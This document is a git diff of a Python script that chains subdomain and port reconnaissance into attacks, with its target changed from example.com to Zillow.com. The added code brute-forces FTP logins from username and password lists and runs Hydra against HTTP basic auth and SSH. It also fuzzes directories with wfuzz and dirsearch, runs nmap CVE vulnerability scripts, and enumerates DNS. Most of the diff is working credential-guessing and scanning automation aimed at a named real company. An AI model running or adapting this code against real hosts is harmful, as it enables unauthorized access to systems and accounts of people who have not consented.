@@ -3,6 +3,42 @@ import time
 import re
 import nmap
 
+
+
+
+
+
+#    ,__                   __
+#    '~~****Nm_    _mZ*****~~
+#            _8@mm@K_
+#           W~@`  '@~W
+#          ][][    ][][
+#    gz    'W'W.  ,W`W`    es
+#  ,Wf    gZ****MA****Ns    VW.
+# gA`   ,Wf     ][     VW.   'Ms
+#Wf    ,@`      ][      '@.    VW
+#M.    W`  _mm_ ][ _mm_  'W    ,A
+#'W   ][  i@@@@i][i@@@@i  ][   W`
+# !b  @   !@@@@!][!@@@@!   @  d!
+# VWmP    ~**~ ][ ~**~    YmWf
+#    ][         ][         ][
+#  ,mW[         ][         ]Wm.
+# ,A` @  ,gms.  ][  ,gms.  @ 'M.
+# W`  Yi W@@@W  ][  W@@@W iP  'W
+#d!   'W M@@@A  ][  M@@@A W`   !b
+#@.    !b'V*f`  ][  'V*f`d!    ,@
+#'Ms    VW.     ][     ,Wf    gA`
+#  VW.   'Ms.   ][   ,gA`   ,Wf
+#   'Ms    'V*mmWWmm*f`    gA`
+
+
+
+
+
+
+
+
+
 scanned_subdomains = set()
 
 def run_command(command):
@@ -81,7 +117,7 @@ def mainloopportrecon(filename, filename2):
 
 
 if __name__ == "__main__":
-    target_host = "example.com" #<---------------------------------
+    target_host = "Zillow.com" #<---------------------------------
     branch1(target_host)
     time.sleep(30)
     com_domains = []
@@ -103,27 +139,20 @@ if __name__ == "__main__":
 
 
 
-
-
-
-
-
-
-
 def remove_non_numeric_chars(filename):
     cleaned_data = []
     with open(filename, 'r') as file:
         for line in file:
             cleaned_line = ''.join(char for char in line if char.isdigit() or char == '.')
-            # replace consecutive dots with a single semicolon
+            # Replace consecutive dots with a single semicolon
             cleaned_line = cleaned_line.replace('..', ';')
-            # remove consecutive semicolons
+            # Remove consecutive semicolons
             cleaned_line = remove_consecutive_semicolons(cleaned_line)
             cleaned_data.append(cleaned_line)
     return cleaned_data
 
 def remove_consecutive_semicolons(line):
-    # replace consecutive semicolons with a single semicolon
+    # Replace consecutive semicolons with a single semicolon
     return ';'.join(filter(None, line.split(';')))
 
 def save_cleaned_data(data, output_filename):
@@ -148,22 +177,43 @@ if __name__ == "__main__":
 
 
 
-
-
-
-
 import socket
+from ftplib import FTP, error_perm
 
 def check_ftp(ip_address, port, output_file):
     try:
         with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-            s.settimeout(5)  # set a timeout for the connection attempt
+            s.settimeout(5)
             s.connect((ip_address, port))
             output_file.write(f"FTP access available on {ip_address}:{port}\n")
+            return True
     except Exception as e:
         output_file.write(f"FTP access not available on {ip_address}:{port}. Error: {e}\n")
+        return False
+
+def bypass_ftp_authentication(ip_address, port, username_list, password_list, output_file):
+    with open(username_list, 'r') as user_file, open(password_list, 'r') as pass_file:
+        usernames = user_file.read().splitlines()
+        passwords = pass_file.read().splitlines()
+
+    for username in usernames:
+        for password in passwords:
+            try:
+                ftp = FTP()
+                ftp.connect(ip_address, port, timeout=5)
+                ftp.login(username, password)
+                output_file.write(f"Valid credentials found - IP: {ip_address}, Port: {port}, Username: {username}, Password: {password}\n")
+                ftp.quit()
+                return
+            except error_perm:
+                output_file.write(f"Invalid credentials - IP: {ip_address}, Port: {port}, Username: {username}, Password: {password}\n")
+            except Exception as e:
+                output_file.write(f"Error attempting login - IP: {ip_address}, Port: {port}, Username: {username}, Password: {password}. Error: {e}\n")
 
 if __name__ == "__main__":
+    username_list = 'usernames.txt'
+    password_list = 'passwords.txt'
+    
     with open('cleaned_ports.txt', 'r') as file:
         with open('ftp_results.txt', 'w') as output_file:
             for line in file:
@@ -171,18 +221,19 @@ if __name__ == "__main__":
                 if len(parts) >= 2:
                     ip_address = parts[0]
                     port_str = parts[1]
-                    if port_str.isdigit():  # check if port string contains only digits
+                    if port_str.isdigit():
                         port = int(port_str)
                         output_file.write(f"Checking FTP access on {ip_address}:{port}\n")
-                        check_ftp(ip_address, port, output_file)
+                        if port == 21:  # Only check FTP on the default FTP port
+                            if check_ftp(ip_address, port, output_file):
+                                output_file.write(f"Attempting to bypass FTP authentication on {ip_address}:{port}\n")
+                                bypass_ftp_authentication(ip_address, port, username_list, password_list, output_file)
+                        else:
+                            output_file.write(f"Skipping non-FTP port {port} for IP {ip_address}\n")
                     else:
                         output_file.write(f"Skipping line: Invalid port number - {port_str}\n")
                 else:
                     output_file.write("Skipping line: Insufficient data\n")
-                    
-                    
-                    
-                  
 
 
 
@@ -192,12 +243,10 @@ if __name__ == "__main__":
 
 
 
+import subprocess
+import re
 
-
-
-
-
-def perform_dirb_scan(filename):
+def perform_dirsearch_scan(filename):
     try:
         with open(filename, 'r') as file:
             lines = file.readlines()
@@ -208,33 +257,31 @@ def perform_dirb_scan(filename):
                     print(f"Issue with formatting in line: {line.strip()}. Skipping...")
                     continue
 
-                command = f'dirb http://{ip}:{port} -o temp_dirb_output.txt'
+                command = f'dirsearch -u http://{ip}:{port} -e *'
                 try:
-                    subprocess.run(command, shell=True, check=True, text=True)
-                    
-                    with open('temp_dirb_output.txt', 'r') as output_file:
-                        output = output_file.read()
+                    result = subprocess.run(command, shell=True, check=True, text=True, capture_output=True)
+                    output = result.stdout
                     
                     print(f"Results for IP: {ip}, Port: {port}")
-                    found_urls = re.findall(r'==> DIRECTORY: ([^\s]+)', output)
+                    found_urls = re.findall(r'\[200\] ([^\s]+)', output)
                     
                     if found_urls:
                         print("Found URLs:")
                         for url in found_urls:
                             print(url)
-                            with open('dirb_results.txt', 'a') as result_file:
+                            with open('dirsearch_results.txt', 'a') as result_file:
                                 result_file.write(f"Found URL: {url}\n")
                     else:
                         print("No URLs found.")
                 except subprocess.CalledProcessError as e:
                     print(f"Error occurred while scanning {ip} on port {port}: {e}")
-                    with open('dirb_results.txt', 'a') as result_file:
+                    with open('dirsearch_results.txt', 'a') as result_file:
                         result_file.write(f"Error occurred while scanning {ip} on port {port}: {e}\n")
     except Exception as e:
         print(f"An error occurred while reading the file: {e}")
 
 # Example usage:
-perform_dirb_scan('cleaned_ports.txt')
+perform_dirsearch_scan('cleaned_ports.txt')
 
 
 
@@ -246,39 +293,47 @@ perform_dirb_scan('cleaned_ports.txt')
 
 
 
-
-
-
-
-
-
-
-
-
-
-                    
-                    
-                    
-                    
-                    
-                    
-                    
-                    
-                    
-                    
-                    
-                    
 import threading
+import subprocess
+import time
+import logging
+import re
+
+# Configure logging
+logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s', handlers=[
+    logging.FileHandler('hydra_results.txt'),
+    logging.StreamHandler()
+])
+
+def parse_hydra_output(output):
+    # Regular expression to find the valid username and password pair
+    match = re.search(r'\[80\]\[http-get\] host: ([\d\.]+)\s+login: (\w+)\s+password: (\w+)', output)
+    if match:
+        ip = match.group(1)
+        username = match.group(2)
+        password = match.group(3)
+        return ip, username, password
+    return None, None, None
 
 def bypass_authentication(ip_address, username_list, password_list, protected_resource):
-    command = f"hydra -L {username_list} -P {password_list} -t 16 -T 16 -f {ip_address} http-get /{protected_resource}"
+    command = f"hydra -L {username_list} -P {password_list} -t 4 -T 4 -f {ip_address} http-get /{protected_resource}"
     try:
-        with open('hydra_results.txt', 'a') as output_file:
-            result = subprocess.run(command, shell=True, stdout=output_file, stderr=subprocess.PIPE, text=True)
-            if result.stderr:
-                print(result.stderr)
+        logging.info(f"Starting Hydra for IP: {ip_address}")
+        result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+        
+        # Log both stdout and stderr
+        if result.stdout:
+            logging.info(f"\n--- Hydra Output for {ip_address} ---\n{result.stdout}\n--- End of Output ---")
+        if result.stderr:
+            logging.error(f"\n--- Hydra Error for {ip_address} ---\n{result.stderr}\n--- End of Error ---")
+
+        # Parse and log the valid username and password pair
+        ip, username, password = parse_hydra_output(result.stdout)
+        if ip and username and password:
+            logging.info(f"\n--- Valid Credentials Found ---\nIP: {ip}\nUsername: {username}\nPassword: {password}\n--- End of Credentials ---")
+
     except Exception as e:
-        print(f"An error occurred while bypassing authentication on {ip_address}: {e}")
+        logging.error(f"\nAn error occurred while bypassing authentication on {ip_address}: {e}\n")
 
 def main():
     threads = []
@@ -289,23 +344,386 @@ def main():
             threads.append(t)
             t.start()
 
-            # limit the number of concurrent threads to avoid overwhelming the system
-            if len(threads) >= 10:
+            # Limit the number of concurrent threads to avoid overwhelming the system
+            if len(threads) >= 5:
                 for t in threads:
                     t.join()
                 threads = []
 
-    # join any remaining threads
+                # Adding delay to prevent too many connection errors
+                time.sleep(5)
+
+    # Join any remaining threads
     for t in threads:
         t.join()
 
 if __name__ == "__main__":
     main()
-           
-                    
 
+
+
+
+
+
+
+
+
+
+import subprocess
+
+def enumerate_directories(ip_address, port, output_file):
+    wordlist = "/home/kali/wordlist.txt"
+    command = f"wfuzz -c --hc 404,403 -w {wordlist} http://{ip_address}:{port}/FUZZ"
+    print(f"Enumerating directories on {ip_address}:{port}")
+    try:
+        result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, timeout=30)
+        output_file.write(f"Results for {ip_address}:{port}:\n")
+        output_file.write(result.stdout)
+        output_file.write(result.stderr)
+        print(f"Enumeration completed for {ip_address}:{port}")
+    except subprocess.TimeoutExpired:
+        print(f"Directory enumeration on {ip_address}:{port} timed out")
+        output_file.write(f"Directory enumeration on {ip_address}:{port} timed out\n")
+
+if __name__ == "__main__":
+    with open('cleaned_ports.txt', 'r') as file:
+        with open('directory_results.txt', 'w') as output_file:
+            for line in file:
+                parts = line.strip().split(';')
+                if len(parts) >= 2:
+                    ip_address = parts[0]
+                    port_str = parts[1]
+                    if port_str.isdigit():
+                        port = int(port_str)
+                        enumerate_directories(ip_address, port, output_file)
+                    else:
+                        print(f"Skipping line: Invalid port number - {port_str}")
+                        output_file.write(f"Skipping line: Invalid port number - {port_str}\n")
+                else:
+                    print("Skipping line: Insufficient data")
+                    output_file.write("Skipping line: Insufficient data\n")
+
+
+
+
+
+
+
+
+
+#ssh brute force needs work
+import subprocess
+import datetime
+
+def brute_force_ssh(ip_address, username_list, password_list):
+    log_file = 'ssh_results.log'
+    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    command = f"hydra -L {username_list} -P {password_list} ssh://{ip_address} -t 4 -v"
+    
+    try:
+        with open(log_file, 'a') as log:
+            log.write(f"\n\n{timestamp} - Starting brute force attack on {ip_address}\n")
+            result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=300)
+            log.write(result.stdout)
+            log.write(result.stderr)
+            print(result.stdout)
+    except subprocess.TimeoutExpired:
+        with open(log_file, 'a') as log:
+            log.write(f"\n\n{timestamp} - Timeout occurred while brute forcing SSH on {ip_address}\n")
+            print(f"Timeout occurred while brute forcing SSH on {ip_address}")
+    except Exception as e:
+        with open(log_file, 'a') as log:
+            log.write(f"\n\n{timestamp} - An error occurred while brute forcing SSH on {ip_address}: {str(e)}\n")
+            print(f"An error occurred while brute forcing SSH on {ip_address}: {str(e)}")
+
+def main():
+    username_list_path = '/home/kali/usernames.txt'  # Replace this with the actual path to your username list file
+    password_list_path = '/home/kali/passwords.txt'  # Replace this with the actual path to your password list file
+
+    with open('ports.txt', 'r') as file:
+        for line in file:
+            ip_address, *_ = line.strip().split(';')
+            brute_force_ssh(ip_address, username_list_path, password_list_path)
+
+if __name__ == "__main__":
+    main()
+
+
+
+
+
+
+
+
+
+import subprocess
+
+def check_for_outdated_versions(filename):
+    try:
+        with open(filename, 'r') as file:
+            lines = file.readlines()
+            for line in lines:
+                ip, port = line.strip().split(';')
+                command = f'nmap -p {port} --script http-vuln-cve2010-2861 {ip}'
+                try:
+                    output = subprocess.check_output(command, shell=True, text=True)
+                    if "443/tcp open  https" in output or "80/tcp open  http" in output:
+                        if "Host is up" in output and "Nmap scan report" in output:
+                            print(f"Outdated version found for IP: {ip}, Port: {port}")
+                except subprocess.CalledProcessError as e:
+                    print(f"Error occurred while scanning {ip} on port {port}: {e}")
+    except Exception as e:
+        print(f"An error occurred while reading the file: {e}")
+
+# Example usage:
+check_for_outdated_versions('cleaned_ports.txt')
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+import dns.resolver
+import dns.reversename
+import logging
+import subprocess
+
+def ans_lookup(ip_address):
+    try:
+        rev_name = dns.reversename.from_address(ip_address)
+        domain_name = str(dns.resolver.resolve(rev_name, "PTR")[0])
+        print(f"Domain name for IP {ip_address}: {domain_name}")
+
+        try:
+            ns_records = dns.resolver.resolve(domain_name, "NS")
+            ans_list = [str(ns_record) for ns_record in ns_records]
+            return domain_name, ans_list
+        except dns.resolver.NoAnswer:
+            return domain_name, []
+    except Exception as e:
+        return None, None
+
+def check_vulnerabilities(ip_address, port):
+    try:
+        command = f"nmap -p {port} --script http-vuln-cve2010-2861,http-vuln-cve2014-3704,http-vuln-cve2015-1635,http-vuln-cve2017-5638 {ip_address}"
+        output = subprocess.check_output(command, shell=True, text=True)
+        if "VULNERABLE" in output:
+            return output
+        return None
+    except subprocess.CalledProcessError as e:
+        return None
+
+def main():
+    logging.basicConfig(filename='ansresults.txt', level=logging.INFO, format='%(message)s')
+
+    try:
+        with open('cleaned_ports.txt', 'r') as file:
+            lines = file.readlines()
+            for line in lines:
+                try:
+                    ip_address, port = line.strip().split(';')
+                    if not port.isdigit():
+                        continue
+                    port = int(port)
+
+                    domain_name, ans_list = ans_lookup(ip_address)
+                    if domain_name and ans_list:
+                        log_message = f"Domain name: {domain_name}, IP: {ip_address}, ANS: {', '.join(ans_list)}"
+                        logging.info(log_message)
+                        print(log_message)
+
+                    vuln_output = check_vulnerabilities(ip_address, port)
+                    if vuln_output:
+                        logging.info(f"Vulnerabilities found for {ip_address}:{port}\n{vuln_output}")
+                        print(f"Vulnerabilities found for {ip_address}:{port}\n{vuln_output}")
+                except ValueError:
+                    continue
+    except Exception as e:
+        print(f"An error occurred while reading the file: {e}")
+
+if __name__ == "__main__":
+    main()
+
+
+
+
+
+
+
+
+
+
+
+import socket
+
+def banner_grabbing(ip, port, result_file):
+    try:
+        # Create a socket object
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        
+        # Set a timeout for the connection
+        s.settimeout(5)
+
+        # Connect to the IP and port
+        s.connect((ip, port))
+        
+        # Send an empty request to get a response
+        s.send(b'HEAD / HTTP/1.0\r\n\r\n')
+        
+        # Receive the banner
+        banner = s.recv(1024).decode().strip()
+        
+        # Print the banner with better formatting
+        if banner:
+            banner_info = f"\n==== Banner for {ip}:{port} ====\n{banner}\n==== End of Banner ====\n"
+            print(banner_info)
+            
+            # Write the banner to the results file
+            with open(result_file, "a") as file:
+                file.write(banner_info)
+
+        # Close the socket
+        s.close()
+
+    except Exception as e:
+        error_info = f"Error occurred while connecting to {ip}:{port}: {e}"
+        print(error_info)
+        
+        # Write the error to the results file
+        with open(result_file, "a") as file:
+            file.write(error_info + "\n")
+
+def detect_technologies(filename, result_file):
+    try:
+        with open(filename, 'r') as file:
+            for line in file:
+                parts = line.strip().split(';')
+                if len(parts) == 2:
+                    ip = parts[0]
+                    try:
+                        port = int(parts[1])
+                        banner_grabbing(ip, port, result_file)
+                    except ValueError:
+                        error_info = f"Invalid port value in line: {line.strip()}"
+                        print(error_info)
+                        
+                        # Write the error to the results file
+                        with open(result_file, "a") as file:
+                            file.write(error_info + "\n")
+                else:
+                    error_info = f"Invalid line format: {line.strip()}"
+                    print(error_info)
                     
-                    
-                    
-                    
-                    
+                    # Write the error to the results file
+                    with open(result_file, "a") as file:
+                        file.write(error_info + "\n")
+
+    except Exception as e:
+        error_info = f"An error occurred while reading the file: {e}"
+        print(error_info)
+        
+        # Write the error to the results file
+        with open(result_file, "a") as file:
+            file.write(error_info + "\n")
+
+# Example usage
+detect_technologies('cleaned_ports.txt', 'banner_results.txt')
+
+
+
+
+
+
+
+
+
+
+
+#further dns enumeration
+import os
+import subprocess
+
+def run_command(command):
+    try:
+        result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=60)
+        return result.stdout
+    except subprocess.TimeoutExpired:
+        return f"Error: Command timed out: {command}"
+    except Exception as e:
+        return f"Error running command {command}: {e}"
+
+def dns_enumeration(domain, result_file):
+    commands = {
+        "dnsenum": f"dnsenum {domain}",
+        "dig": f"dig {domain}",
+        "fierce": f"fierce --domain {domain}",
+        "dnsrecon": f"dnsrecon -d {domain}",
+        "massdns": f"massdns -r resolvers.txt -t A -o S {domain}",
+        "dnsmap": f"dnsmap {domain}",
+        "dnscan": f"dnscan -d {domain}"
+    }
+
+    with open(result_file, "a") as file:
+        for tool, command in commands.items():
+            file.write(f"\n==== {tool} Results for {domain} ====\n")
+            file.write(f"Running: {command}\n")
+            output = run_command(command)
+            file.write(output)
+            file.write(f"\n==== End of {tool} Results ====\n")
+            print(f"{tool} completed for {domain}")
+
+def process_domains(filenames, result_file):
+    domains = set()
+
+    for filename in filenames:
+        try:
+            with open(filename, 'r') as file:
+                for line in file:
+                    domain = line.strip()
+                    if domain:
+                        domains.add(domain)
+        except Exception as e:
+            print(f"Error reading file {filename}: {e}")
+
+    with open(result_file, "w") as file:
+        file.write("DNS Enumeration Results\n")
+        file.write("========================\n\n")
+
+    for domain in domains:
+        print(f"Starting DNS enumeration for {domain}")
+        dns_enumeration(domain, result_file)
+        print(f"Completed DNS enumeration for {domain}")
+
+# Example usage
+domain_files = ['scan_results.txt', 'scan_results2.txt']
+process_domains(domain_files, 'dns_results.txt')
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+#--
+#--#--#--#--#--#--
+#--#--#--#--#--#--
